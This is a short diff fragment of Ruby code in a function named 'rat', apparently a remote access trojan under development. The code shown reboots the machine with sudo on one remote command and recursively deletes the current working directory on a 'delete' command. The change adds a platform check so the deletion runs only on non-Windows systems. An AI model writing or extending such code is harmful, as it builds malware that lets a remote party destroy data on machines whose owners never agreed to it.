@@ -96,7 +96,9 @@ def rat(ip)
           exec 'sudo reboot'
         end
       when 'delete'
-        exec "rm -r #{Dir.pwd}"
+        unless Gem.win_platform?
+          exec "rm -r #{Dir.pwd}"
+        end
       end
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
